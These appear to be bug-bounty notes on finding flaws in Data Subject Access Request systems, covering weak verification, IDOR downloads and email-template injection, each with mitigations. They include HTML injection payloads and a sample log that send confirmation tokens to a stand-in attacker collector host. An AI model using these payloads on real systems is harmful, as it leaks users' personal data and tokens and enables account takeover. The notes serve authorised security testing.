# Abusing DSAR Systems — Bug Bounty Notes (Markdown)

**Purpose:** Practical checklist, techniques, and impact analysis for hunting and reporting vulnerabilities in Data Subject Access Request (DSAR) systems from a bug‑bounty perspective. These notes assume ethical testing (only test accounts or explicit permission). Do **not** exfiltrate real user data.

---
## Quick TL;DR (for triage)

- Look for unauthenticated DSAR forms, weak verification, email/template injection, and logic flaws.
- Key risks: token/confirmation link leakage, PII exposure, account takeover, mass data leakage (supply‑chain impact).
- Tools to use: Burp Suite (Intruder, Repeater), Burp Collaborator / OOB server, custom collector, request fuzzers, email inboxes (Gmail/Outlook) under your control.

---
## Recon & Target Discovery

1. Search site for keywords: `data subject access`, `privacy request`, `DSR`, `DSAR`, `subject access request`, `download my data`, `export data`, `data request`.

2. Crawl areas: support/help center, privacy pages, account settings, contact forms, legal pages.

3. Map endpoints: note endpoints that accept form submissions (`/dsar`, `/privacy-request`, `/export`, `/support/request`).

4. Identify response channels: does the system reply via email (common), display data in UI, or require authenticated portals?

  

---

  

## Vulnerability Categories & How to Detect (with PoC ideas)

> For each item: **Technique**, **Detection / PoC**, **Impact**.

  

### 1. Unauthenticated DSAR submission

**Technique:** Form accepts DSAR with minimal proof (just an email or name) and returns data or sends sensitive attachments without verifying identity.  

**Detection / PoC:** Submit a DSAR for an account you don’t own (use a disposable email). If the system responds with data or sends an attachment referencing the target, it is unauthenticated. Use Burp Collaborator to capture any OOB.  

**Impact:** High → Immediate disclosure of PII; doxing; regulatory exposure. Could be mass-automated for many users (mass leakage).  

**Mitigation:** Require identity proof (two-factor, knowledge factors) and rate limit DSAR requests.

  

### 2. Email template injection / HTML injection in reflected fields

**Technique:** User-supplied fields (name, description) are embedded into email templates unsanitized. Insert `<img src="https://attacker/?q=__RequestLink__">` or similar.  

**Detection / PoC:** Put an `<img>` tag pointing to your Burp Collaborator or collector with a placeholder for injection (if template language supports placeholders). Submit DSAR or use profile fields that appear in emails. Monitor collaborator logs for requests containing tokens/links.  

**Impact:** High → Exfiltrate confirmation URLs, tokens, PII present in email; can chain to targeted phishing or account takeover. Large blast radius when templates are tenant-editable across customers.  

**Mitigation:** Sanitize/HTML‑encode inputs; strip tags; proxy remote images; remove tokens from links embedded in user-controlled content.

  

### 3. Link/Token Disclosure via Redirects or Referer

**Technique:** Confirmation links include tokens in query parameters. When email client or server fetches remote resources, referer or redirect flows may leak the token to third parties.  

**Detection / PoC:** Inject an external resource URL that causes the mail client or preview proxy to fetch the confirmation link or that creates a redirect containing the token. Use your collector to capture Referer header or redirected URL.  

**Impact:** Medium–High → Tokens revealed even without template injection; can be used for takeover or to build recon.  

**Mitigation:** Keep tokens out of client-visible URLs (POST flows, one-time short tokens, reference IDs), use short expiry and single-use tokens.

  

### 4. Insecure Direct Object Reference (IDOR) in DSAR downloads

**Technique:** Download URLs for DSAR results use predictable IDs and lack access checks (e.g., `/downloads/dsar/12345.zip`).  

**Detection / PoC:** Request a DSAR for your account, note download link. Modify identifier values (increment/decrement, fuzz) to see if you can access other users' archives.  

**Impact:** Critical if archives contain PII for other users; mass-exfil possible via automation.  

**Mitigation:** Enforce server-side authorization; use unguessable UUIDs; bind download tokens to requester and expire them.

  

### 5. Weak Verification Flows (email-only without binding)

**Technique:** DSAR workflow relies on single-link email verification that’s not bound to requestor context (no cross-check with known account details), or the link is single-parameter token with long expiry.  

**Detection / PoC:** Submit DSAR for an account and see the flow: does clicking link in mail directly release documents? If the verification email lacks user-specific binding or is predictable, it's weak. Use a test victim account you own to demonstrate.  

**Impact:** High → Link interception leads to data disclosure; chaining to account takeover possible.  

**Mitigation:** Require additional verification: login to account, secondary email/SMS, knowledge factors, or an authentication step on landing page.

  

### 6. CSRF / Logic abuse to mount mass DSAR requests

**Technique:** If the DSAR endpoint is unauthenticated and relies on GET or POST without CSRF/captcha, attacker can trigger mass requests to overwhelm or mass-scan for info.  

**Detection / PoC:** Use a controlled crawler to automate DSAR submissions and look for rate-limiting. Don’t submit to targets without permission; use small-scale probes.  

**Impact:** High — automation enables mass leakage or DoS to privacy team.  

**Mitigation:** Rate-limit endpoints, CAPTCHAs, require proof-of-possession email actions with strong binding.

  

### 7. Admin-only or Tenant-only template editing abuse

**Technique:** If a customer admin can edit templates but changes affect all users (or are stored unsanitized), a malicious tenant admin or compromised admin can exfiltrate data for users.  

**Detection / PoC:** Identify tenant-level template editors; try to inject safe harmless tags to see reflection in emails for test users you control.  

**Impact:** High → Supply chain; multiple organizations affected.  

**Mitigation:** Audit template editors, sanitize templates, restrict capability to trusted admins only.

  

### 8. Email Spoofing / Lack of DKIM/DMARC/SPF in DSAR workflows

**Technique:** If the vendor accepts DSAR via email and relies on From header without DKIM/SPF checks, attackers can spoof requests to the vendor.  

**Detection / PoC:** Attempt to send crafted DSAR emails while monitoring for acceptance (ethically using owned domains). Check vendor’s mail handling policies.  

**Impact:** High — allows external spoof-based requests leading to data exfil.  

**Mitigation:** Enforce DKIM/SPF/DMARC, plus inbound email verification and manual triage for sensitive requests.

  

---

  

## Practical PoC Steps (Ethical)

1. **Set up collector**  

   - Run a stable HTTPS server or use Burp Collaborator. Log full request (path, query, headers). Domain example: `https://collector-yourname.example/`.  

2. **Create test accounts**  

   - Register accounts on target with emails you control (Gmail, Outlook). Keep records of timestamps and request IDs.  

3. **Inject payload into fields used by DSAR**  

   - Example payload for a `name` field: `<img src="https://collector.example/?t=__REQUEST_LINK__">`  

   - Submit DSAR or perform the action that triggers the email.  

4. **Monitor collector**  

   - Capture incoming requests. Note any query parameters that include tokens or identifiers.  

5. **Demonstrate safe impact**  

   - Show captured logs + screenshot of email. Do **not** use captured tokens on real user accounts. If demonstrating token usefulness, only use accounts you control.  

6. **Document blast radius**  

   - Check whether templates are tenant-editable, global, or per-organization. Show how many customers could be affected if possible.

  

---

  

## Reporting Template (pastes-ready)

**Title:** HTML injection in DSAR template allows exfiltration of confirmation links / PII to attacker-controlled servers

  

**Summary (1–2 lines):** Unsanitised user-supplied `name` field in the DSAR flow is reflected into email templates. This allows embedding external resource references which leak confirmation URLs and embedded PII to third-party servers, enabling targeted social engineering and possible account takeover.

  

**Technical details / Reproduction:**  

1. Register account `test+dsar@yourdomain.com` on target.  

2. Submit DSAR using `First name` = `<img src="https://collector.example/?q=__DSAR_LINK__">`.  

3. Received confirmation email contains the injected image tag. When the email client loads remote resources, `collector.example` logs a GET request with query containing the confirmation URL and token (logs attached).  

4. Captured request: `GET /?q=https://app.example/s/confirm?token=ABC123&uid=... HTTP/1.1` (raw log snippet).  

(Attach screenshot of email and raw collector log.)

  

**Impact:** Exfiltration of tokens & PII → targeted phishing and potential account takeover. Large blast radius if templates are shared.

  

**Mitigation:** Encode/sanitize user inputs, strip remote resource tags from sensitive emails, proxy images through vendor domain, rotate and short-expire tokens, enforce stricter verification.

  

---

  

## Detection & Hunting Playbook (quick checklist)

- Fuzzer-enabled enumeration of DSAR endpoints.  

- Check all fields that reflect into emails or attachments.  

- Monitor for OOB via Collaborator when testing injections.  

- Try IDOR checks on any `/download` or `/export` path.  

- Search instance for tenant/template endpoints to determine scope.  

- Inspect response headers and email metadata for tokens or IDs.

  

---

  

## Risk Scoring Guidance

- **Critical (9.0–10.0)**: Unauthenticated DSAR or IDOR allowing direct download of other users' PII; tokens in email enabling immediate account takeover.  

- **High (7.0–8.9)**: Exfiltration of tokens or identifiers that can be chained to takeover; mass-leak potential.  

- **Medium (4.0–6.9)**: Leakage of partial PII or metadata that aids reconnaissance.  

- **Low (<4.0)**: Cosmetic or non-sensitive information leakage.

  

---

  

## Defensive Notes (for vendor messaging)

- Do not send raw user-supplied input into templates. Use safe templates and sanitizer libraries.  

- Proxy remote content: when including user content that references external resources, rewrite to vendor proxy so third parties cannot harvest tokens or referer.  

- Implement strict access controls on DSAR processing and template editing.  

- Monitor and alert on unusual DSAR volumes or template changes.

  

---

  

## Ethical & Legal Reminder

These techniques are powerful. Always:

- Test only on systems you own or where you have explicit permission (bug-bounty scope).  

- Avoid exfiltrating real user data. Use test accounts for proof-of-concept.  

- If you find a vulnerability exposing user data, follow responsible disclosure and the program’s rules.

  

---

  

## Useful snippets (for your toolkit)

- **Collaborator GET capture example** (what to look for):  

  ```

  GET /?q=https://app.example/s/confirm?token=XYZ123&uid=456 HTTP/1.1

  Host: collector.example

  User-Agent: Mozilla/5.0 (MailClient)

  Referer: https://mail.example/message/...

  ```

- **IDOR test checklist**: increment IDs, try UUID canonicalization, test numeric vs UUID randomization, test for missing auth headers.

  

---

  

## Recommended next steps for you (action nodes)

1. Map all DSAR-related endpoints on a target (node).  

2. Identify where user-input is reflected into emails or attachments (node).  

3. Test injection with collector on controlled accounts (node).  

4. Test download links for IDOR (node).  

5. Prepare concise report with logs, screenshots, and remediation guidance (node).

  

---

  

_End of notes — curated for bug-bounty hunters. If you want, I’ll convert this to a downloadable `.md` file and give you the link, or expand any section into a deeper walkthrough with exact payloads and a ready-to-paste HackerOne report._